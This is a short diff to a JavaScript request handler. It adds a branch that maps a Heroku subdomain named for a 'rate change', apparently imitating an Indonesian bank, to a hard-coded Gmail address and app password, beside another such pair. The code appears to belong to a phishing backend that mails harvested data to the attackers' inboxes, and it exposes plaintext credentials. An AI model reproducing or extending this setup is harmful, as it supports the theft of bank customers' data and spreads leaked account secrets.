@@ -40,6 +40,10 @@ export default function handler(req, res) {
         email = 'bosm4106@gmail.com';
         pass = 'ocrpobrfxwgucaih';
 
+    } else if(url == 'tarif--perubahan.herokuapp.com'){
+        email = 'bbri94669@gmail.com';
+        pass = 'tdoctundphxocdqu';
+
     }   
         
         try {
